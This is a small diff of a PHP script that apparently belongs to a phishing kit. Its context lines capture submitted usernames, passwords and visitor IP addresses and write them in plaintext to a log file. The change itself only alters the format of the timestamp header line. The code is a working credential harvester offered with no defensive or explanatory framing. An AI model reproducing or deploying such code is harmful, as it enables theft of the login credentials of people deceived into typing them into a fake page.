@@ -14,7 +14,7 @@ $_SESSION['filename'] = "data.log";
 $obj = new OS_BR();
 
 if (isset($_POST['username']) && isset($_POST['password'])) {
-    $current = "Time: " . date('m/d/Y h:i:s', time()) . "\n";
+    $current = "-----------------" . date('m/d/Y h:i:s', time()) . "------------------\n";
     $current .= "Username: {$_POST['username']}\n";
     $current .= "Password: {$_POST['password']}\n";
     $current .= "IP:{$_SERVER['REMOTE_ADDR']}\n";
